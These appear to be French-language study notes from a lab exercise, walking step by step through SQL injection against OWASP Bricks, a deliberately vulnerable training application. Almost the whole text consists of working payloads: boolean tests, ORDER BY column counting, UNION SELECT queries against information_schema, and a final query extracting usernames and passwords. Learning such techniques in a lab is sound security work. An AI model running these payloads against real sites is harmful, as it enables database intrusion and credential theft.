http://owaspbwa/owaspbricks/content-1/index.php?id=0

id=1
-> renvoi un autre utilisateur

id=0' LIMIT 1
-> renvoi une erreur ce. Notre quote a "casser" la requete. Signe d'une SQLi possible

id=0 and 1=1
-> Page affichée sans erreur. 1=1 est TRUE

id=0 and 1=2
-> la deuxième condition est fausse ça ne renvoi pas d'utilisateur

id=0 order by 1
...
id=0 order by 8
id=0 order by 9
-> à 9 colonnes ça plante ! la table des utilisateurs contient donc 8 colonnes.

id=0 UNION SELECT 1,2,3,4,5,6,7,8
-> Retourne 2 enregistrements le user admin (id=0) et un enregistrement avec les entiers 1..8

id=0 and 1=2 UNION SELECT 1,2,3,4,5,6,7,8
-> un seul enregistrment retourné : les entiers 1..8 car id=0 and 1=2 ne renvoi rien, bien que l'ID soit valide, la condition est FALSE

id=0 and 1=2 UNION SELECT user(),2,3,4,5,6,7,8
On peut maintenany récupérer l'utilisateur connecté à la BDD
database() : base de donnée courante , table_name, column_name,

id=0 and 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_schema='bricks' and table_name='users' LIMIT 0,1 -- -
-> renvoi le nom de la première colonne "idusers"

Pour avoir le second champ :
id=0 and 1=2 UNION SELECT column_name,2,3,4,5,6,7,8 from information_schema.columns where table_schema='bricks' and table_name='users' LIMIT 1,1 -- -
...
et continuer jusuqu'a : ... LIMIT 7,1

Récupére le nom user et pass  séparé par un espace
id=0 and 1=2 UNION SELECT concat(name,CHAR(32),password),2,3,4,5,6,7,8 from bricks.users LIMIT 0,1 -- -
